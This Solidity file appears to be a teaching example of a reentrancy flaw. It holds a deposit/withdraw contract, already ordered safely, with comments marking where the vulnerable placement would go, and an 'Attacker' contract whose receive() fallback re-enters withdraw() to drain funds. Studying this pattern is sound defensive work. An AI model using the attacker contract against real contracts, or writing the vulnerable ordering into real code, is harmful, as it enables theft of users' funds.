// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Classic Reentrancy
contract Vulnurable {
    mapping(address user => uint256 funds) balances;

    function deposite() public payable {
        require(msg.value < 2 ether);
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amt = balances[msg.sender];
        balances[msg.sender] = 0; // if done here, re-entry not possible

        (bool sent,) = payable(msg.sender).call{value: amt}("");
        require(sent, "Not enough funds");

        // balances[msg.sender] = 0; if done here, re-entry possible
    }
}

contract Attacker {
    address addr;

    function adding(address _addr) public payable {
        addr = _addr;
        Vulnurable(addr).deposite{value: msg.value}();
    }

    function get() public {
        Vulnurable(addr).withdraw();
    }

    receive() external payable {
        try Vulnurable(addr).withdraw() {} catch {}
    }
}
